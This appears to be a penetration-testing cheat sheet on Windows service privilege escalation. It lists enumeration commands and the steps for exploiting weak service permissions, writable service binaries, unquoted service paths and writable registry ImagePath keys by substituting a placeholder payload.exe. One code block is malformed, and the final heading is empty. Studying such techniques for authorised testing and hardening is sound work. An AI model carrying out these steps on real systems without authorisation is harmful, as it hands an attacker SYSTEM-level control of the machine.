# Service - Privilege Escalation

## Insecure Service Permissions

Check service permissions:

    accesschk.exe /accepteula -uwcqv USERNAME SERVICE_NAME
    accesschk.exe /accepteula -uwcqv USERNAME *

Get service details

    sc qc SERVICE_NAME

Modify the service config and set the BINARY_PATH_NAME

    sc config SERVICE_NAME binpath= "\"C:\payload.exe\""

Run the payload

    net start SERVICE_NAME

## Insecure Service Executables

Check service with weak file permission

    C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\Service\Servicenames.exe"

```
wmic.exe  
```powershell
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"  
```
sc.exe
```powershell
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt  
FOR /F %i in (Servicenames.txt) DO echo %i  
type Servicenames.txt  
FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt  
FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt  
```

Overwrite service binary with the payload

    copy C:\payload.exe "C:\Program Files\Servicenames.exe" /y

Run the payload

    net start SERVICE_NAME

## Unquoted Service Path  

Find vulnerable service:

```powershell
wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\windows\\" |findstr /i /v """  
```

### E.G.
Service path

    "C:\Program Files\Unquoted Path Service\service.exe"

Test permission

    C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"

    or 

    icacls "C:\Program Files\Unquoted Path Service"

Payload

    copy C:\payload.exe "C:\Program Files\Unquoted\Unquoted.exe"

Run payload

    net start SERVICE_NAME

## Weak Registry Permissions

List all service permission service:

    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\

Find vulnerable service:

    accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\SERVICE_NAME

If permission are:

    RW NT AUTHORITY\INTERACTIVE
        KEY_ALL_ACCESS

Overwrite the ImagePath registry key:

    reg add HKLM\SYSTEM\CurrentControlSet\services\SERVICE_NAME /v ImagePath /t REG_EXPAND_SZ /d C:\payload.exe /f

## Insecure Service Executables

